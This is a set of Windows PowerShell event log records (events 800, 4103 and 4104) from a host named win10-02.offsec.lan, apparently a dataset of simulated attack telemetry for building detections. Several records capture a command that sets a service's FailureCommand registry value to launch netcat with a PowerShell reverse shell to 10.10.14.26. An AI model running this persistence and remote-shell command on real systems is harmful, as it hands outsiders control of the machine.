{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"PowerShell"},"EventID_attributes":{"Qualifiers":0},"EventID":800,"Version":0,"Level":4,"Task":8,"Opcode":0,"Keywords":"0x80000000000000","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:30:51.224140Z"},"EventRecordID":1172290,"Correlation":null,"Execution_attributes":{"ProcessID":0,"ThreadID":0},"Channel":"Windows PowerShell","Computer":"win10-02.offsec.lan","Security":null},"EventData":{"Data":{"#text":["","\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=2438\r\n\r\n\tUserId=OFFSEC\\admmig\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1237\r\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1237\r\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\r\n\tPipelineId=183\r\n\tScriptName=\r\n\tCommandLine=","CommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\"\r\n"]},"Binary":null}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4103,"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:30:51.237331Z"},"EventRecordID":1341625,"Correlation_attributes":{"ActivityID":"82305249-B6DD-0001-1C38-5882DDB6D701"},"Execution_attributes":{"ProcessID":1636,"ThreadID":9868},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1237\r\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n        Engine Version = 5.1.19041.1237\r\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\r\n        Pipeline ID = 183\r\n        Command Name = PSConsoleHostReadLine\r\n        Command Type = Function\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 2439\r\n        User = OFFSEC\\admmig\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\"\r\n"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"PowerShell"},"EventID_attributes":{"Qualifiers":0},"EventID":800,"Version":0,"Level":4,"Task":8,"Opcode":0,"Keywords":"0x80000000000000","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:30:51.239789Z"},"EventRecordID":1172291,"Correlation":null,"Execution_attributes":{"ProcessID":0,"ThreadID":0},"Channel":"Windows PowerShell","Computer":"win10-02.offsec.lan","Security":null},"EventData":{"Data":{"#text":["Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name FailureCommand -value \"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"","\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=2444\r\n\r\n\tUserId=OFFSEC\\admmig\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1237\r\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1237\r\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\r\n\tPipelineId=184\r\n\tScriptName=\r\n\tCommandLine=Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name FailureCommand -value \"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"","CommandInvocation(Set-ItemProperty): \"Set-ItemProperty\"\r\nParameterBinding(Set-ItemProperty): name=\"Path\"; value=\"HKLM:\\System\\CurrentControlSet\\services\\xboxgip\"\r\nParameterBinding(Set-ItemProperty): name=\"Name\"; value=\"FailureCommand\"\r\nParameterBinding(Set-ItemProperty): name=\"Value\"; value=\"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"\r\n"]},"Binary":null}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"PowerShell"},"EventID_attributes":{"Qualifiers":0},"EventID":800,"Version":0,"Level":4,"Task":8,"Opcode":0,"Keywords":"0x80000000000000","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:30:51.239789Z"},"EventRecordID":1172292,"Correlation":null,"Execution_attributes":{"ProcessID":0,"ThreadID":0},"Channel":"Windows PowerShell","Computer":"win10-02.offsec.lan","Security":null},"EventData":{"Data":{"#text":["","\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=2448\r\n\r\n\tUserId=OFFSEC\\admmig\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1237\r\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1237\r\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\r\n\tPipelineId=184\r\n\tScriptName=\r\n\tCommandLine=","CommandInvocation(Out-Default): \"Out-Default\"\r\n"]},"Binary":null}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:30:51.247102Z"},"EventRecordID":1341626,"Correlation_attributes":{"ActivityID":"82305249-B6DD-0001-2139-5882DDB6D701"},"Execution_attributes":{"ProcessID":1636,"ThreadID":9868},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name FailureCommand -value \"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"","ScriptBlockId":"0654a304-20aa-4c04-b6b9-8f5bc13220bb","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4103,"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:30:51.251980Z"},"EventRecordID":1341627,"Correlation_attributes":{"ActivityID":"82305249-B6DD-0001-2239-5882DDB6D701"},"Execution_attributes":{"ProcessID":1636,"ThreadID":9868},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1237\r\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n        Engine Version = 5.1.19041.1237\r\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\r\n        Pipeline ID = 184\r\n        Command Name = Set-ItemProperty\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 2445\r\n        User = OFFSEC\\admmig\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(Set-ItemProperty): \"Set-ItemProperty\"\r\nParameterBinding(Set-ItemProperty): name=\"Path\"; value=\"HKLM:\\System\\CurrentControlSet\\services\\xboxgip\"\r\nParameterBinding(Set-ItemProperty): name=\"Name\"; value=\"FailureCommand\"\r\nParameterBinding(Set-ItemProperty): name=\"Value\"; value=\"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"\r\n"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4103,"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:30:51.252360Z"},"EventRecordID":1341628,"Correlation_attributes":{"ActivityID":"82305249-B6DD-0001-2139-5882DDB6D701"},"Execution_attributes":{"ProcessID":1636,"ThreadID":9868},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1237\r\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n        Engine Version = 5.1.19041.1237\r\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\r\n        Pipeline ID = 184\r\n        Command Name = \r\n        Command Type = Script\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 2449\r\n        User = OFFSEC\\admmig\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(Out-Default): \"Out-Default\"\r\n"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"PowerShell"},"EventID_attributes":{"Qualifiers":0},"EventID":800,"Version":0,"Level":4,"Task":8,"Opcode":0,"Keywords":"0x80000000000000","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:30:51.255410Z"},"EventRecordID":1172293,"Correlation":null,"Execution_attributes":{"ProcessID":0,"ThreadID":0},"Channel":"Windows PowerShell","Computer":"win10-02.offsec.lan","Security":null},"EventData":{"Data":{"#text":["    Microsoft.PowerShell.Core\\Set-StrictMode -Off\n","\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=2463\r\n\r\n\tUserId=OFFSEC\\admmig\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1237\r\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1237\r\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\r\n\tPipelineId=186\r\n\tScriptName=C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadLine.psm1\r\n\tCommandLine=    Microsoft.PowerShell.Core\\Set-StrictMode -Off\n","CommandInvocation(Set-StrictMode): \"Set-StrictMode\"\r\nParameterBinding(Set-StrictMode): name=\"Off\"; value=\"True\"\r\n"]},"Binary":null}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:30:51.266323Z"},"EventRecordID":1341629,"Correlation_attributes":{"ActivityID":"82305249-B6DD-0001-2439-5882DDB6D701"},"Execution_attributes":{"ProcessID":1636,"ThreadID":9868},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"prompt","ScriptBlockId":"02523ed7-a302-4032-88c8-d5d52f7addd7","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4103,"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:30:51.269333Z"},"EventRecordID":1341630,"Correlation_attributes":{"ActivityID":"82305249-B6DD-0001-2939-5882DDB6D701"},"Execution_attributes":{"ProcessID":1636,"ThreadID":9868},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1237\r\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n        Engine Version = 5.1.19041.1237\r\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\r\n        Pipeline ID = 186\r\n        Command Name = Set-StrictMode\r\n        Command Type = Cmdlet\r\n        Script Name = C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadLine.psm1\r\n        Command Path = \r\n        Sequence Number = 2464\r\n        User = OFFSEC\\admmig\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(Set-StrictMode): \"Set-StrictMode\"\r\nParameterBinding(Set-StrictMode): name=\"Off\"; value=\"True\"\r\n"}}}
